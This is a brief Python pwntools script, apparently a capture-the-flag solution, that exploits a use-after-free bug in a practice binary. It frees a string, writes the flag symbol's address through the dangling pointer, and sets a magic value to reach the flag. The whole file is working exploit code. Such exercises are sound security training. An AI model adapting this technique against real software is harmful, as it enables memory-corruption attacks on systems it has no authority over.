from pwn import *

elf = ELF("use_after_free")

p = elf.process()

def set_string(string):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", string)

def del_string():
    p.sendlineafter(b"> ", b"3")
    
def set_num(num):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"> ", num)

# 1.
set_string(b"AAAA")
del_string()

# 2. 
set_num(str(elf.sym["flag"]).encode())

# 3.
set_string(p32(0x31337))

p.interactive()